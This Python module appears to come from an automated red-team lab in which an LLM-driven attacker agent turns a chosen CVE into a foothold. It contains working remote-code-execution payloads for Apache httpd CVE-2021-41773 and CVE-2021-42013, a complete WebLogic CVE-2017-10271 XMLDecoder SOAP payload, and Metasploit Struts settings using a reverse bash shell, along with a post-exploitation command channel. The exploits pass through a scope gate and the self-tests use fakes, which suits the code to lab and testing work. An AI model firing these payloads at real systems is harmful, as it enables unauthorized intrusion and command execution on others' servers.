"""CVE-keyed weapon toolkit — how red FIRES a vector it identified (multi-modality).

Red's LLM identifies a CVE from the fingerprint (swarm.live_vector); this module turns that
CVE into a REAL, grounded foothold using whatever genuinely exploits it:

  1. an MSF SESSION module, when the LIVE catalog has one for the CVE (auto-discovered via
     swarm.live_msf.confirm_vector — nothing hardcoded; struts, gitlab ground this way), OR
  2. the response/marker weapon for that CVE from red's arsenal (resident in this module), when the
     CVE grounds via the exploit's own HTTP-response / blind marker rather than a session
     (httpd CVE-2021-41773, weblogic CVE-2017-10271, postgres CVE-2019-9193).

Selection is keyed on the CVE RED identified — a toolkit lookup exactly like MSF's own
`search cve:`, NEVER a host→exploit map (that is the banned hardcoding). Every path fires
through `gate.dispatch`, grounds through `validate_finding` + the confirm→mutate spine (a
real session OR a real `uid=` in the exploit output — never an agent self-report), and returns
an EARNED command channel (`exec`) red uses for post-exploitation: the MSF `session_execute`,
or the response weapon's own RCE channel. A CVE with no weapon is an honest `exploit.deferred`.
"""
import sys
import secrets
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from swarm import spine                                   # noqa: E402
from swarm.gate import OutOfScope, run_effect            # noqa: E402  (one effect path)
from swarm.msf import gated_msf_exploit                   # noqa: E402
from swarm.live_msf import confirm_vector                 # noqa: E402
from swarm.polymorph import validate_finding              # noqa: E402


# ── Response/marker HTTP-RCE weapons (ported out of the retired cheat-sheet toolkit) ──
# These are the four REAL weapons red carries for the response/marker modality: one source of
# truth per CVE for the raw HTTP-RCE request, the host-side httpd and weblogic exploits that
# fire it, and the build-time inventory of CVEs red can deliver over a shell. Keyed ONLY on the
# CVE red inferred — never a host→exploit map. Targets are explicit (the host-published edge the
# caller reaches); there is no run-context fallback, which is exactly the cheat-sheet that was cut.

def http_rce_request(cve, cmd):
    """Red's registered HTTP-RCE requests, keyed by CVE. Returns (method, path, body, headers)
    or None if red carries no implementation for this CVE. The call site decides HOW to send
    these bytes (host-side Python HTTP, or bash /dev/tcp through an earned shell), so the
    exploit's essence (the traversal path, the body shape) lives in ONE place across modalities."""
    if cve == "CVE-2021-41773":
        # Apache httpd 2.4.49 path-traversal -> mod_cgi RCE (T1190). Path kept raw (no %2e
        # normalization), the CVE's essence. Body is run as a shell script by /bin/sh; its
        # stdout returns in the HTTP response, so the pop is directly groundable.
        return ("POST", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
                f"echo Content-Type: text/plain; echo; {cmd}",
                {"Content-Type": "application/x-www-form-urlencoded"})
    if cve == "CVE-2021-42013":
        # The sister path-traversal (Apache 2.4.50). Same delivery shape; different encoding.
        return ("POST", "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
                f"echo Content-Type: text/plain; echo; {cmd}",
                {"Content-Type": "application/x-www-form-urlencoded"})
    return None


def http_rce_cves():
    """CVEs red carries an http_rce_request implementation for. Build-time inventory used by
    `live_lateral.supported` (range_gen's spine shaper) — NOT an attack-time oracle. Attack
    time still goes through the LLM planner (live_vector) + the live MSF catalog."""
    return ("CVE-2021-41773", "CVE-2021-42013")


def exploit_apache_cgi(target="localhost", port=8080, cmd="id"):
    """Initial access: Apache httpd 2.4.49 path-traversal -> mod_cgi RCE (CVE-2021-41773,
    T1190). HOST-SIDE channel: Python http.client to target:port. Request bytes come from the
    shared `http_rce_request("CVE-2021-41773", cmd)` builder — the same bytes a shell-side
    delivery would send (see swarm/live_lateral). Lab-only; routed through gate.dispatch upstream."""
    import http.client
    req = http_rce_request("CVE-2021-41773", cmd)
    if req is None:                              # defensive: should never happen
        return {"success": False, "error": "no request builder for CVE-2021-41773",
                "cve": "CVE-2021-41773"}
    method, path, body, headers = req
    try:
        conn = http.client.HTTPConnection(target, port, timeout=10)
        conn.request(method, path, body=body, headers=headers)
        out = conn.getresponse().read().decode("utf-8", "replace").strip()
        return {"success": "uid=" in out, "output": out, "cve": "CVE-2021-41773"}
    except Exception as e:
        return {"success": False, "error": str(e)[:200], "cve": "CVE-2021-41773"}


def exploit_weblogic(target="localhost", port=7001, cmd="id", container=None):
    """Initial access: Oracle WebLogic 10.3.6 wls-wsat XMLDecoder SOAP RCE
    (CVE-2017-10271, T1190). A crafted SOAP envelope with an XMLDecoder-serialized
    ProcessBuilder on /wls-wsat/CoordinatorPortType is deserialized server-side and
    runs `cmd` as the WebLogic container user. The CVE is BLIND (no RCE output in
    the HTTP response), so we write stdout to a per-attack marker file in /tmp and
    read it back via `docker exec` on the earned foothold — the file's existence
    with real `uid=` output is the exploit's own side effect, groundable by XBOW.
    Vulhub-vendored (ranges/vulhub/CVE-2017-10271), boot-vetted; routed through
    gate.dispatch; `cmd` is shell, keep it range-local."""
    import http.client
    host = target or "localhost"
    marker = "/tmp/.wls_vet_" + secrets.token_hex(6)
    ctr = container or (f"range-{host}" if host != "localhost" else "real-weblogic")
    payload = (
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soapenv:Header>'
        '<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">'
        '<java version="1.4.0" class="java.beans.XMLDecoder">'
        '<void class="java.lang.ProcessBuilder">'
        '<array class="java.lang.String" length="3">'
        '<void index="0"><string>/bin/bash</string></void>'
        '<void index="1"><string>-c</string></void>'
        f'<void index="2"><string>{cmd} &gt; {marker} 2&gt;&amp;1</string></void>'
        '</array><void method="start"/></void></java></work:WorkContext>'
        '</soapenv:Header><soapenv:Body/></soapenv:Envelope>'
    )
    try:
        conn = http.client.HTTPConnection(host, port, timeout=15)
        conn.request("POST", "/wls-wsat/CoordinatorPortType",
                     body=payload, headers={"Content-Type": "text/xml",
                                            "SOAPAction": ""})
        resp = conn.getresponse(); resp.read()
    except Exception as e:
        return {"success": False, "error": str(e)[:200], "cve": "CVE-2017-10271"}
    # Retrieve the exploit's side effect (the marker file written by the forked
    # /bin/bash via ProcessBuilder). Give the forked process a moment to complete.
    out = ""
    for _ in range(10):
        try:
            r = run_effect(["docker", "exec", ctr, "cat", marker],
                               capture_output=True, text=True, timeout=5)
            if r.returncode == 0 and r.stdout.strip():
                out = r.stdout.strip(); break
        except Exception:
            pass
        import time as _t; _t.sleep(0.5)
    run_effect(["docker", "exec", ctr, "rm", "-f", marker],
                   capture_output=True, timeout=5)
    return {"success": "uid=" in out, "output": out, "cve": "CVE-2017-10271",
            "marker": marker, "container": ctr}


# Per-MSF-MODULE datastore extras — weapon operation config keyed on the MODULE (how the
# weapon is driven), never on a host. Live-proven: struts grounds with TARGETURI=/ + a cmd
# reverse payload. A module absent here fires on the stand-up's default options alone.
_MODULE_OPTS = {
    "exploit/multi/http/struts2_content_type_ognl": {"TARGETURI": "/", "PAYLOAD": "cmd/unix/reverse_bash"},
}


def _gated_exec_channel(raw, gate, actor, target, rport, *, technique="T1059"):
    """Wrap an earned command channel `raw(cmd) -> out` (e.g. an MSF session_execute) so EVERY
    post-exploitation invocation re-enters gate.dispatch on `target` first (A3 acceptance 2). The
    raw call runs ONLY inside the dispatch tool_fn `_run`, so no post-ex command touches the host
    without a gate verdict."""
    def channel(cmd):
        def _run():
            return raw(cmd)
        return gate.dispatch(actor, "run_command", target, _run, command=cmd,
                             meta=spine.coords(actor, target, rport, technique))
    return channel


def _try_msf(cve, *, msf, gate, log, actor, target, rhost, rport):
    """Fire any live-catalog SESSION module for the CVE. Returns a grounded dict or None.
    The earned `exec` channel re-enters gate.dispatch on every call (see _gated_exec_channel)."""
    for module, _rank in confirm_vector(msf["client"], cve):
        opts = {**msf.get("options", {}), **_MODULE_OPTS.get(module, {})}
        res = gated_msf_exploit(gate, log, actor, target, client=msf["client"], module=module,
                                rhost=rhost, rport=rport, cve=cve, options=opts)
        if res:
            sid = res["session_id"]
            raw = (lambda c, _s=sid: msf["client"].session_execute(_s, c))
            return {"grounded": True, "method": f"msf:{module}", "cve": cve,
                    "session_id": sid,
                    "exec": _gated_exec_channel(raw, gate, actor, target, rport)}
    return None


def _response_weapon(cve, *, gate, log, actor, target, rport, pub_host, pub_port, fire_fn=None):
    """Fire red's response/marker exploit for `cve` through the gate and, on a grounded pop, return
    an EARNED channel that re-enters gate.dispatch on `target` for EVERY post-ex command.

    A3: the exploit's own HTTP/shell effect (exploit_apache_cgi / exploit_weblogic / the struts
    run_command) is invoked ONLY inside the dispatch tool_fn `_run`, so a static reachability
    oracle (t1b) sees no red-reachable effect outside gate.dispatch, and no command runs on the
    popped host without a gate verdict. `fire_fn` overrides the real exploit in tests."""
    nonce = secrets.token_hex(5)
    url = f"http://{pub_host}:{pub_port}/"

    def exec_channel(cmd):
        def _run():
            if fire_fn is not None:                       # test override (a fake, no real exploit)
                return fire_fn(cmd)
            if cve == "CVE-2017-5638":
                from swarm import exploit as _exp
                return _exp.run_command(cmd, target=url) or ""
            if cve in ("CVE-2021-41773", "CVE-2021-42013"):
                return (exploit_apache_cgi(target=pub_host, port=pub_port, cmd=cmd) or {}).get("output", "")
            if cve == "CVE-2017-10271":
                return (exploit_weblogic(target=pub_host, port=pub_port, cmd=cmd) or {}).get("output", "")
            return ""
        return gate.dispatch(actor, "run_command", target, _run, command=cmd,
                             meta=spine.coords(actor, target, rport, "T1059", cve=cve))

    def _do():
        out = exec_channel(f"id; echo DS{nonce}") or ""   # grounding command, itself dispatched
        v = validate_finding({"output": out}, log.entries(), "rce")
        if not (v["valid"] and (f"DS{nonce}" in out or "uid=" in out)):
            log.append(actor, "foothold_failed",
                       {"dst": target, "via": "response-exploit", "cve": cve,
                        "reason": v["reason"], "out": out[:160]})
            return {"grounded": False, "method": None, "exec": None, "cve": cve}
        c = spine.confirm(log, "foothold", target, observed_by="exploit-response",
                          simulated=False, method=f"response:{cve}",
                          marker_confirmed=True, marker_output=out[:160])
        spine.mutate(log, actor, "foothold", target, via_confirm=c["seq"],
                     via="response-exploit", cve=cve, as_user="service")
        return {"grounded": True, "method": f"response:{cve}", "cve": cve,
                "session_id": None,              # response-channel pop, no MSF session
                "exec": exec_channel}

    try:
        return gate.dispatch(actor, "exploit", target, _do,
                             meta=spine.coords(actor, target, rport, "T1190", cve=cve))
    except OutOfScope:
        return {"grounded": False, "method": None, "exec": None, "cve": cve}


# Red's entry-exploit arsenal: the CVEs it carries a host-side weapon for. This is red's own
# CAPABILITY set (what exploits it has), NOT a host->CVE oracle — red still has to land one.
ARSENAL = ("CVE-2017-5638", "CVE-2021-41773", "CVE-2017-10271")


def fire_vector(cve, *, target, rhost, rport, pub_host, pub_port, gate, log, msf=None,
                actor="red", response_weapons=None):
    """Turn red's identified CVE into a grounded foothold, multi-modality. Returns
    {grounded, method, exec, cve}. `msf` is the live_msf.standup_msfrpcd result (or None).
    `response_weapons` overrides the arsenal (tests): {cve: make(pub_host,pub_port)->fire_fn}.
    The CVE is red's — this only weaponizes. Every earned channel re-dispatches per command."""
    if msf and cve:
        got = _try_msf(cve, msf=msf, gate=gate, log=log, actor=actor,
                       target=target, rhost=rhost, rport=rport)
        if got:
            return got
    if response_weapons is not None:                      # test override
        make = response_weapons.get(cve)
        if make is not None:
            return _response_weapon(cve, gate=gate, log=log, actor=actor, target=target,
                                    rport=rport, pub_host=pub_host, pub_port=pub_port,
                                    fire_fn=make(pub_host, pub_port))
    elif cve in ARSENAL:
        return _response_weapon(cve, gate=gate, log=log, actor=actor, target=target,
                                rport=rport, pub_host=pub_host, pub_port=pub_port)
    log.append(actor, "exploit.deferred",
               {"dst": target, "cve": cve, "reason": "no weapon for this CVE (MSF or arsenal)"})
    return {"grounded": False, "method": None, "exec": None, "cve": cve}


if __name__ == "__main__":  # self-check: both modalities + honest no-weapon, offline (no Docker)
    from swarm.eventlog import EventLog
    from swarm.gate import Gate
    from swarm.msf import MsfClient, FakeMsfBackend
    import tempfile, json as _json

    SCOPE = {"red": ["svc_struts", "svc_httpd", "svc_unknown"]}

    # --- modality 1: MSF SESSION. Arm the fake catalog's struts module for the target IP;
    #     confirm_vector finds it, gated_msf_exploit opens a session, fire_vector grounds and
    #     returns a session-backed exec.
    be = FakeMsfBackend().arm("exploit/multi/http/struts2_content_type_ognl", "10.9.0.10",
                              extra_cmds={"whoami": "root"})
    msf = {"client": MsfClient(be), "lhost": "10.9.0.3",
           "options": {"PAYLOAD": "cmd/unix/reverse_bash", "LPORT": 4444, "LHOST": "10.9.0.3", "SSL": False}}
    log = EventLog(Path(tempfile.mktemp(suffix=".jsonl")))
    gate = Gate([], log, resolve_ips=False, scope_by_actor=SCOPE)
    r = fire_vector("CVE-2017-5638", target="svc_struts", rhost="10.9.0.10", rport=8080,
                    pub_host="localhost", pub_port=18090, gate=gate, log=log, msf=msf)
    assert r["grounded"] and r["method"].startswith("msf:"), r
    assert r["exec"]("whoami") == "root", "MSF earned channel (session_execute) must work"

    # --- modality 2: RESPONSE/marker weapon. A fake arsenal weapon returns real uid= output;
    #     fire_vector grounds it through the gate + validate_finding + spine, no MSF needed.
    def fake_httpd(pub_host, pub_port):
        return lambda cmd: f"uid=33(www-data) gid=33 groups=33\n{cmd.split('echo ')[-1]}"
    log2 = EventLog(Path(tempfile.mktemp(suffix=".jsonl")))
    gate2 = Gate([], log2, resolve_ips=False, scope_by_actor=SCOPE)
    r2 = fire_vector("CVE-2021-41773", target="svc_httpd", rhost="10.9.0.11", rport=80,
                     pub_host="localhost", pub_port=18091, gate=gate2, log=log2, msf=None,
                     response_weapons={"CVE-2021-41773": fake_httpd})
    assert r2["grounded"] and r2["method"] == "response:CVE-2021-41773", r2
    assert "uid=" in r2["exec"]("id"), "response earned channel must execute"
    ev2 = [_json.loads(x) for x in log2.path.read_text().splitlines() if x.strip()]
    # grounded strictly through confirm->mutate (the spine), never a self-report
    assert any(e["action"] == "confirm" and e["data"]["fidelity"] == "real" for e in ev2), ev2
    assert any(e["action"] == "state.mutate" and e["data"]["state"] == "foothold" for e in ev2), ev2

    # --- honest no-weapon: a CVE with neither an MSF module nor an arsenal entry defers,
    #     never a fake pop.
    log3 = EventLog(Path(tempfile.mktemp(suffix=".jsonl")))
    gate3 = Gate([], log3, resolve_ips=False, scope_by_actor=SCOPE)
    r3 = fire_vector("CVE-9999-0000", target="svc_unknown", rhost="10.9.0.99", rport=1234,
                     pub_host="localhost", pub_port=18099, gate=gate3, log=log3, msf=None,
                     response_weapons={})
    assert not r3["grounded"] and r3["exec"] is None, r3
    assert _json.loads(log3.path.read_text().splitlines()[-1])["action"] == "exploit.deferred"

    # --- an out-of-scope target is gate-blocked even with a real weapon (the floor holds)
    log4 = EventLog(Path(tempfile.mktemp(suffix=".jsonl")))
    gate4 = Gate([], log4, resolve_ips=False, scope_by_actor={"red": ["in_only"]})
    r4 = fire_vector("CVE-2021-41773", target="oos_host", rhost="10.9.0.11", rport=80,
                     pub_host="localhost", pub_port=18091, gate=gate4, log=log4, msf=None,
                     response_weapons={"CVE-2021-41773": fake_httpd})
    assert not r4["grounded"], r4
    assert any(_json.loads(x)["action"] == "gate.block"
               for x in log4.path.read_text().splitlines() if x.strip()), "OOS must be blocked"

    print("live_weapon ok (CVE-keyed multi-modality: an MSF session module grounds struts "
          "with a session-backed exec; a response/marker weapon grounds httpd via a real uid= "
          "through confirm->mutate with its own RCE channel; an unknown CVE defers honestly; "
          "an out-of-scope target is gate-blocked even with a real weapon)")
